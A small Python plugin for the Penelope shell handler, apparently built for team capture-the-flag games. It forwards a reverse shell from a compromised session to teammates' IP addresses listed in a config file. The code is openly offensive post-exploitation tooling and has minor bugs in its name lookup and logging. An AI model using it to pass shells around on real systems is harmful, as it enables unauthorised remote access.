"""
Send revshell for teaming CTFs for Penelope
by DystopianRescuer
"""


class send(Module):
    enabled = True
    category = "ETSCTF"
    on_session_start = False
    on_session_end = False

    list_exist = False

    def run(session, args):
        """
        Send a revshell to a member of your team
        """

        args = args.split()
        if not args:
            logger.error("Debes poner a quien quieres mandar una revshell")
            return

        # Check if list is defined in peneloperc
        if not send.list_exist:
            try:
                test = team_members
                send.list_exist = True
            except NameError:
                logger.error("Lista de miembros no definida en peneloperc")

        if args[0].lower() == "all":
            for name, ip in team_members.items():
                logger.info(f"Enviando revshell a {name} ({ip})")
                session.spawn(port=default_send_port, host=ip)
        else:
            for arg in args:
                if ip := team_members[arg]:
                    logger.info(f"Enviando revshell a {args[0]} ({ip})...")
                    session.spawn(port=default_send_port, host=ip)
                else:
                    logger.error(f"El miembro {arg} no está registrado")
